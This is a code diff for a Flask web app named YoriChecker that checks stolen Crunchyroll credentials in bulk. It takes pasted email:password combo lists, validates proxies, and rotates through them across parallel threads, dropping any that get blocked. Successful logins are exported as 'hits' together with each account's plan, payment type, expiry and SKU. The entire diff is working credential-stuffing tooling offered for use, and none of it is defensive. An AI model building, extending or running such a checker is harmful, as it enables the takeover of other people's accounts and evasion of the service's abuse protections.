@@ -4,6 +4,7 @@ import json
 import time
 import uuid
 import threading
+import requests
 from flask import Flask, request, render_template_string, send_file, Response
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from checker import CrunchyrollChecker
@@ -13,128 +14,254 @@ app = Flask(__name__)
 tasks = {}
 task_lock = threading.Lock()
 
-class ProxyManager:
-    def __init__(self, proxies):
-        self.proxies = [p.strip() for p in proxies if p.strip()]
-        self.index = 0
-        self.lock = threading.Lock()
-        self.last_given = None
-
-    def get_proxy(self):
-        with self.lock:
-            if not self.proxies:
-                return None
-            proxy = self.proxies[self.index % len(self.proxies)]
-            self.index += 1
-            self.last_given = proxy
-            return proxy
-
-    def mark_bad(self, proxy=None):
-        with self.lock:
-            target = proxy or self.last_given
-            if target and target in self.proxies:
-                self.proxies.remove(target)
-
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YoriChecker</title>
+    <title>YoriChecker // Brutalist</title>
     <style>
-        body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; max-width: 1000px; margin: 0 auto; }
-        h2 { color: #f39c12; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .container { display: flex; gap: 20px; flex-wrap: wrap; }
-        .col { flex: 1; min-width: 300px; }
-        label { display: block; margin-top: 15px; font-weight: bold; color: #bbb; }
-        textarea { width: 100%; height: 150px; background: #1e1e1e; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; margin-top: 5px; box-sizing: border-box; }
-        input[type="file"] { margin-top: 5px; color: #bbb; }
-        button { margin-top: 20px; padding: 12px 24px; background: #f39c12; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; width: 100%; }
-        button:disabled { background: #555; cursor: not-allowed; color: #999; }
-        button:hover:not(:disabled) { background: #e67e22; }
-        #status { margin-top: 20px; padding: 10px; background: #1e1e1e; border-left: 4px solid #f39c12; font-weight: bold; display: none; }
-        #progressContainer { display: none; margin-top: 20px; }
-        .progress-bar-bg { background: #333; border-radius: 4px; overflow: hidden; height: 20px; }
-        .progress-bar-fill { background: #f39c12; height: 100%; width: 0%; transition: width 0.3s; }
-        #progressText { margin-top: 5px; text-align: center; font-weight: bold; }
+        body {
+            background: #111;
+            color: #eee;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 {
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 4px solid #f39c12;
+            padding-bottom: 10px;
+            text-shadow: 4px 4px 0px #000;
+            margin-top: 0;
+        }
+        .panels { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
+        .panel {
+            flex: 1;
+            min-width: 300px;
+            background: #222;
+            border: 2px solid #444;
+            box-shadow: 8px 8px 0px #000;
+            padding: 15px;
+        }
+        .panel h3 {
+            margin-top: 0;
+            border-bottom: 2px solid #555;
+            padding-bottom: 5px;
+            text-transform: uppercase;
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            background: #000;
+            color: #0f0;
+            border: 2px solid #555;
+            padding: 10px;
+            font-family: monospace;
+            box-sizing: border-box;
+            box-shadow: inset 4px 4px 0px #111;
+        }
+        input[type="file"] {
+            margin-top: 10px;
+            color: #ccc;
+            display: block;
+        }
+        .btn {
+            background: #f39c12;
+            color: #000;
+            border: 2px solid #000;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 6px 6px 0px #000;
+            transition: transform 0.1s, box-shadow 0.1s;
+            font-family: monospace;
+            width: 100%;
+            margin-top: 20px;
+        }
+        .btn:hover { transform: translate(2px, 2px); box-shadow: 4px 4px 0px #000; }
+        .btn:active { transform: translate(6px, 6px); box-shadow: 0px 0px 0px #000; }
+        .btn:disabled {
+            background: #555;
+            color: #888;
+            cursor: not-allowed;
+            box-shadow: 6px 6px 0px #000;
+            transform: none;
+        }
+        .btn-small {
+            background: #e74c3c;
+            color: #fff;
+            border: 2px solid #000;
+            padding: 8px 15px;
+            font-size: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 4px 4px 0px #000;
+            margin-top: 10px;
+            font-family: monospace;
+            transition: transform 0.1s, box-shadow 0.1s;
+        }
+        .btn-small:hover { transform: translate(1px, 1px); box-shadow: 3px 3px 0px #000; }
+        .btn-small:active { transform: translate(4px, 4px); box-shadow: 0px 0px 0px #000; }
+        #logArea {
+            background: #000;
+            border: 2px solid #444;
+            box-shadow: 8px 8px 0px #000;
+            height: 300px;
+            overflow-y: scroll;
+            padding: 15px;
+            font-size: 14px;
+            color: #0f0;
+            white-space: pre-wrap;
+            margin-top: 20px;
+        }
+        #downloadBtn {
+            display: none;
+            background: #2ecc71;
+        }
+        .status-text {
+            margin-top: 10px;
+            font-weight: bold;
+            color: #f39c12;
+        }
     </style>
 </head>
 <body>
-    <h2>YoriChecker // Crunchyroll</h2>
     <div class="container">
-        <div class="col">
-            <label>Combos (email:password)</label>
-            <textarea id="combos_text" placeholder="user@domain.com:password123"></textarea>
-            <input type="file" id="combos_file" accept=".txt">
+        <h1>YoriChecker // Crunchyroll</h1>
+        
+        <div class="panels">
+            <div class="panel">
+                <h3>Combos</h3>
+                <textarea id="combos_text" placeholder="email:pass"></textarea>
+                <input type="file" id="combos_file" accept=".txt">
+            </div>
+            <div class="panel">
+                <h3>Proxies</h3>
+                <textarea id="proxies_text" placeholder="ip:port:user:pass or ip:port"></textarea>
+                <input type="file" id="proxies_file" accept=".txt">
+                <button class="btn-small" id="validateBtn" onclick="validateProxies()">VALIDATE PROXIES</button>
+                <div class="status-text" id="proxyStatus">Load proxies to begin.</div>
+            </div>
         </div>
-        <div class="col">
-            <label>Proxies (ip:port:user:pass or ip:port)</label>
-            <textarea id="proxies_text" placeholder="127.0.0.1:8080"></textarea>
-            <input type="file" id="proxies_file" accept=".txt">
-        </div>
-    </div>
-    
-    <button id="validateBtn" onclick="validate()">VALIDATE</button>
-    <div id="status"></div>
-    
-    <div id="progressContainer">
-        <div class="progress-bar-bg">
-            <div id="progressBar" class="progress-bar-fill"></div>
-        </div>
-        <div id="progressText"></div>
+        
+        <button class="btn" id="startBtn" disabled onclick="startChecking()">START CHECKING</button>
+        
+        <div id="logArea">[System] Awaiting input...</div>
+        
+        <button class="btn" id="downloadBtn">DOWNLOAD RESULTS</button>
     </div>
 
     <script>
-        async function validate() {
-            const btn = document.getElementById('validateBtn');
-            const status = document.getElementById('status');
-            const progressContainer = document.getElementById('progressContainer');
-            const progressBar = document.getElementById('progressBar');
-            const progressText = document.getElementById('progressText');
+        let workingProxies = [];
+        let combosLoaded = false;
+        let proxiesValidated = false;
 
-            btn.disabled = true;
-            status.style.display = 'block';
-            status.textContent = "Processing... gnawing through the list.";
-            status.style.borderLeftColor = '#f39c12';
-            progressContainer.style.display = 'block';
-            progressBar.style.width = '0%';
-            progressText.textContent = 'Starting...';
+        function updateStartButton() {
+            document.getElementById('startBtn').disabled = !(combosLoaded && proxiesValidated);
+        }
 
-            const formData = new FormData();
-            formData.append('combos_text', document.getElementById('combos_text').value);
-            formData.append('combos_file', document.getElementById('combos_file').files[0]);
-            formData.append('proxies_text', document.getElementById('proxies_text').value);
-            formData.append('proxies_file', document.getElementById('proxies_file').files[0]);
+        document.getElementById('combos_text').addEventListener('input', () => {
+            combosLoaded = document.getElementById('combos_text').value.trim().length > 0;
+            updateStartButton();
+        });
+        document.getElementById('combos_file').addEventListener('change', () => {
+            combosLoaded = document.getElementById('combos_file').files.length > 0;
+            updateStartButton();
+        });
 
-            try {
-                const startRes = await fetch('/start_check', { method: 'POST', body: formData });
-                if (!startRes.ok) throw new Error("Failed to start task");
-                const { task_id } = await startRes.json();
-
-                const evtSource = new EventSource(`/progress/${task_id}`);
-                evtSource.onmessage = function(event) {
-                    const data = JSON.parse(event.data);
-                    if (data.done) {
-                        evtSource.close();
-                        window.location.href = `/download/${task_id}`;
-                        btn.disabled = false;
-                        status.textContent = "Done. Hits stashed and downloaded.";
-                        status.style.borderLeftColor = '#2ecc71';
-                    } else if (data.checked !== undefined) {
-                        const pct = (data.checked / data.total) * 100;
-                        progressBar.style.width = pct + '%';
-                        progressText.textContent = `Checking ${data.checked} of ${data.total}`;
-                    } else if (data.error) {
-                        evtSource.close();
-                        throw new Error(data.error);
+        async function processStream(url, payload, onMessage) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+            let buffer = '';
+            while(true) {
+                const {done, value} = await reader.read();
+                if(done) break;
+                buffer += decoder.decode(value, {stream: true});
+                const lines = buffer.split('\\n');
+                buffer = lines.pop();
+                for(const line of lines) {
+                    if(line.startsWith('data: ')) {
+                        try {
+                            onMessage(JSON.parse(line.substring(6)));
+                        } catch(e) {}
                     }
-                };
-            } catch (err) {
-                status.textContent = "Error: " + err.message;
-                status.style.borderLeftColor = '#e74c3c';
-                btn.disabled = false;
+                }
             }
+        }
+
+        async function validateProxies() {
+            const text = document.getElementById('proxies_text').value;
+            const file = document.getElementById('proxies_file').files[0];
+            
+            let proxiesText = text;
+            if (file) proxiesText += '\\n' + await file.text();
+            
+            const proxies = proxiesText.split('\\n').filter(l => l.trim());
+            if (proxies.length === 0) {
+                proxiesValidated = false;
+                updateStartButton();
+                return;
+            }
+            
+            proxiesValidated = false;
+            updateStartButton();
+            document.getElementById('validateBtn').disabled = true;
+            document.getElementById('proxyStatus').textContent = 'Validating...';
+            
+            const logArea = document.getElementById('logArea');
+            logArea.innerHTML = '';
+            
+            await processStream('/validate_proxies', {proxies: proxiesText}, (data) => {
+                if (data.log) {
+                    logArea.innerHTML += data.log + '\\n';
+                    logArea.scrollTop = logArea.scrollHeight;
+                } else if (data.event === 'done') {
+                    workingProxies = data.working_proxies;
+                    logArea.innerHTML += `\\n${data.count}\\n`;
+                    logArea.scrollTop = logArea.scrollHeight;
+                    proxiesValidated = workingProxies.length > 0;
+                    document.getElementById('validateBtn').disabled = false;
+                    document.getElementById('proxyStatus').textContent = data.count;
+                    updateStartButton();
+                }
+            });
+        }
+
+        async function startChecking() {
+            const combosText = document.getElementById('combos_text').value;
+            const combosFile = document.getElementById('combos_file').files[0];
+            let fullCombos = combosText;
+            if (combosFile) fullCombos += '\\n' + await combosFile.text();
+            
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').textContent = 'CHECKING...';
+            document.getElementById('logArea').innerHTML = '';
+            
+            await processStream('/check', {combos: fullCombos, working_proxies: workingProxies}, (data) => {
+                if (data.log) {
+                    document.getElementById('logArea').innerHTML += data.log + '\\n';
+                    document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
+                } else if (data.event === 'done') {
+                    document.getElementById('downloadBtn').style.display = 'block';
+                    document.getElementById('downloadBtn').onclick = () => {
+                        window.location.href = `/download/${data.task_id}`;
+                    };
+                    document.getElementById('startBtn').textContent = 'START CHECKING';
+                    document.getElementById('startBtn').disabled = false;
+                }
+            });
         }
     </script>
 </body>
@@ -145,129 +272,150 @@ HTML_TEMPLATE = """
 def index():
     return render_template_string(HTML_TEMPLATE)
 
-@app.route('/start_check', methods=['POST'])
-def start_check():
-    combos_text = request.form.get('combos_text', '')
-    combos_file = request.files.get('combos_file')
-    proxies_text = request.form.get('proxies_text', '')
-    proxies_file = request.files.get('proxies_file')
+@app.route('/validate_proxies', methods=['POST'])
+def validate_proxies():
+    data = request.json
+    proxies = [p.strip() for p in data.get('proxies', '').splitlines() if p.strip()]
+    
+    def stream():
+        working = []
+        for p in proxies:
+            try:
+                proxy_dict = {"http": p, "https": p}
+                r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5)
+                if r.status_code == 200:
+                    yield f"data: {json.dumps({'log': f'Testing {p}... ✓ working', 'working': True})}\n\n"
+                    working.append(p)
+                else:
+                    yield f"data: {json.dumps({'log': f'Testing {p}... ✗ failed (status {r.status_code})', 'working': False})}\n\n"
+            except Exception as e:
+                yield f"data: {json.dumps({'log': f'Testing {p}... ✗ failed ({str(e)[:20]})', 'working': False})}\n\n"
+        
+        yield f"data: {json.dumps({'event': 'done', 'working_proxies': working, 'count': f'Found {len(working)} working proxies out of {len(proxies)}'})}\n\n"
+        
+    return Response(stream(), mimetype='text/event-stream')
 
-    def parse_lines(text, file):
-        lines = text.splitlines()
-        if file and file.filename:
-            lines.extend(file.read().decode('utf-8').splitlines())
-        return [l.strip() for l in lines if l.strip()]
-
-    combos_lines = parse_lines(combos_text, combos_file)
-    proxies_lines = parse_lines(proxies_text, proxies_file)
-
+@app.route('/check', methods=['POST'])
+def check():
+    data = request.json
+    combos_raw = data.get('combos', '')
+    working_proxies = data.get('working_proxies', [])
+    
     combos = []
-    for line in combos_lines:
+    for line in combos_raw.splitlines():
+        line = line.strip()
         if ':' in line:
             parts = line.split(':', 1)
             if len(parts) == 2 and parts[0] and parts[1]:
                 combos.append((parts[0], parts[1]))
-
-    if not combos:
-        return {"error": "No valid combos found"}, 400
-
+                
     task_id = str(uuid.uuid4())
-    with task_lock:
-        tasks[task_id] = {
-            'total': len(combos),
-            'checked': 0,
-            'done': False,
-            'results': []
-        }
-
-    threading.Thread(target=run_checker, args=(task_id, combos, proxies_lines)).start()
-
-    return {"task_id": task_id}
-
-def run_checker(task_id, combos, proxies):
-    proxy_mgr = ProxyManager(proxies) if proxies else None
-    checker = CrunchyrollChecker(proxy_mgr)
+    
+    proxy_pool = list(working_proxies)
+    pool_lock = threading.Lock()
+    results = []
+    results_lock = threading.Lock()
+    logs = []
+    logs_lock = threading.Lock()
+    
+    def log(msg):
+        with logs_lock:
+            ts = time.strftime("%H:%M:%S")
+            logs.append(f"[{ts}] {msg}")
+            
+    def remove_proxy(p):
+        with pool_lock:
+            if p in proxy_pool:
+                proxy_pool.remove(p)
+                return True
+            return False
 
     def check_combo(email, password):
-        attempts = 0
-        last_result = None
-        while attempts < 3:
-            result = checker.check_account(email, password)
-            last_result = result
-            if result.get('status') == 'ERROR' and 'proxy' in result.get('error', '').lower():
-                if proxy_mgr:
-                    proxy_mgr.mark_bad()
-                attempts += 1
-                continue
-            break
-        return last_result
-
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        futures = {executor.submit(check_combo, e, p): (e, p) for e, p in combos}
-        for future in as_completed(futures):
-            e, p = futures[future]
-            res = future.result()
-            with task_lock:
-                tasks[task_id]['checked'] += 1
-                tasks[task_id]['results'].append((e, p, res))
-
-    with task_lock:
-        tasks[task_id]['done'] = True
-
-@app.route('/progress/<task_id>')
-def progress(task_id):
-    def stream():
-        last_checked = -1
         while True:
+            with pool_lock:
+                if not proxy_pool:
+                    log(f"{email} -> PROXY ERROR (all burned)")
+                    return {'email': email, 'password': password, 'status': 'PROXY_ERROR', 'data': {}, 'error': 'All proxies burned'}
+                proxy = proxy_pool.pop(0)
+                proxy_pool.append(proxy)
+            
+            log(f"Checking {email} with proxy {proxy}...")
+            
+            class SingleProxyMgr:
+                def __init__(self, p): self.p = p
+                def get_proxy(self): return self.p
+                def mark_bad(self): pass
+            
+            checker = CrunchyrollChecker(SingleProxyMgr(proxy))
+            res = checker.check_account(email, password)
+            
+            if res.get('status') == 'ERROR' and any(x in res.get('error', '').lower() for x in ['proxy', 'timeout', 'connection']):
+                log(f"Proxy {proxy} burned – removed from pool")
+                remove_proxy(proxy)
+                continue
+            
+            log(f"{email} -> {res.get('status')}")
+            return res
+
+    def run():
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = {executor.submit(check_combo, e, p): (e, p) for e, p in combos}
+            for future in as_completed(futures):
+                res = future.result()
+                with results_lock:
+                    results.append(res)
+        
+        with task_lock:
+            tasks[task_id] = results
+
+    threading.Thread(target=run).start()
+    
+    def stream():
+        last_log_idx = 0
+        while True:
+            with logs_lock:
+                current_logs = list(logs)
+            
+            for i in range(last_log_idx, len(current_logs)):
+                yield f"data: {json.dumps({'log': current_logs[i]})}\n\n"
+            last_log_idx = len(current_logs)
+            
             with task_lock:
-                task = tasks.get(task_id)
-                if not task:
-                    yield f"data: {json.dumps({'error': 'Task not found'})}\n\n"
+                if task_id in tasks:
+                    yield f"data: {json.dumps({'event': 'done', 'task_id': task_id})}\n\n"
                     break
-                checked = task['checked']
-                total = task['total']
-                done = task['done']
-            
-            if checked > last_checked:
-                yield f"data: {json.dumps({'checked': checked, 'total': total})}\n\n"
-                last_checked = checked
-            
-            if done:
-                yield f"data: {json.dumps({'done': True})}\n\n"
-                break
             
             time.sleep(0.5)
+            
     return Response(stream(), mimetype='text/event-stream')
 
 @app.route('/download/<task_id>')
 def download(task_id):
     with task_lock:
-        task = tasks.get(task_id)
-    
-    if not task:
-        return "Task not found", 404
-
+        task_results = tasks.get(task_id, [])
+        
     hits = []
     fails = []
     errors = []
     frees = []
 
-    for e, p, res in task['results']:
-        if not res:
-            fails.append(f"{e}:{p} | Unknown error")
-            continue
-        
+    for res in task_results:
+        e = res.get('email', '')
+        p = res.get('password', '')
         status = res.get('status')
+        
         if status == 'HIT':
             d = res.get('data', {})
-            hits.append(f"{e}:{p} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Country: {d.get('country', 'N/A')} | Auto-Renew: {d.get('renew', 'N/A')}")
+            hits.append(f"{e}:{p} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Country: {d.get('country', 'N/A')} | Auto-Renew: {d.get('renew', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Payment: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}")
         elif status == 'FREE':
             frees.append(f"{e}:{p} | Free account - no subscription")
         elif status == 'INVALID':
             fails.append(f"{e}:{p} | Invalid credentials")
+        elif status == 'PROXY_ERROR':
+            errors.append(f"{e}:{p} | All proxies burned")
         elif status == 'ERROR':
             err_msg = res.get('error', 'Unknown error')
-            if 'proxy' in err_msg.lower() or 'timeout' in err_msg.lower() or 'connection' in err_msg.lower():
+            if any(x in err_msg.lower() for x in ['proxy', 'timeout', 'connection']):
                 errors.append(f"{e}:{p} | {err_msg}")
             else:
                 fails.append(f"{e}:{p} | {err_msg}")
@@ -297,7 +445,7 @@ def download(task_id):
     output.append(sep)
 
     mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
-    return send_file(mem, as_attachment=True, download_name='yoricheckerwebsite.onrender.com/.txt', mimetype='text/plain')
+    return send_file(mem, as_attachment=True, download_name='YoriChecker.vercel.app.txt', mimetype='text/plain')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
